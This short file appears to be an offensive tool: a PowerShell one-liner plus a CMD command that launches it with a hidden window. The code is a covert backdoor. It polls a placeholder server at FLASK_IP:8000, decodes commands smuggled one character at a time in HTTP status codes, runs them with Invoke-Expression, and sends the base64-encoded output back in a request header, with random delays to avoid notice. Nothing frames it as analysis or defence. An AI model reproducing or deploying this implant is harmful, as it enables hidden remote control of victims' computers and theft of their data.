# Original command to be executed in PowerShell.

$S="http://FLASK_IP:8000";$B="";$G=[guid]::NewGuid().ToString();while($true){try{$C=[int](Invoke-WebRequest "$S/poll" -UseBasicParsing -Headers @{"X-Client"=$G} -ErrorAction Stop).StatusCode}catch{try{$C=$_.Exception.Response.StatusCode.Value__}catch{$C=0}};if($C-ge 200 -and $C-le 326){$x=$C-200;if($x-eq 10){try{$R=Invoke-Expression $B|Out-String}catch{$R=$_|Out-String};$E=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($R.Trim()));$r=[System.Net.WebRequest]::Create("$S/poll");$r.Method="GET";$r.Headers.Add("X-Output",$E);$r.Headers.Add("X-Client",$G);try{$r.GetResponse().Close()}catch{};$B=""}elseif($x-ge 32 -and $x-le 126){$B+=[char]$x}};Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 1500)}

# Execute in Windows CMD and hide terminal.

powershell -w hidden -Command "$S=\"http://FLASK_IP:8000\";$B=\"\";$G=[guid]::NewGuid().ToString();while($true){try{$C=[int](Invoke-WebRequest \"$S/poll\" -UseBasicParsing -Headers @{\"X-Client\"=$G} -ErrorAction Stop).StatusCode}catch{try{$C=$_.Exception.Response.StatusCode.Value__}catch{$C=0}};if($C-ge 200 -and $C-le 326){$x=$C-200;if($x-eq 10){try{$R=Invoke-Expression $B|Out-String}catch{$R=$_|Out-String};$E=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($R.Trim()));$r=[System.Net.WebRequest]::Create(\"$S/poll\");$r.Method=\"GET\";$r.Headers.Add(\"X-Output\",$E);$r.Headers.Add(\"X-Client\",$G);try{$r.GetResponse().Close()}catch{};$B=\"\"}elseif($x-ge 32 -and $x-le 126){$B+=[char]$x}};Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 1500)}"
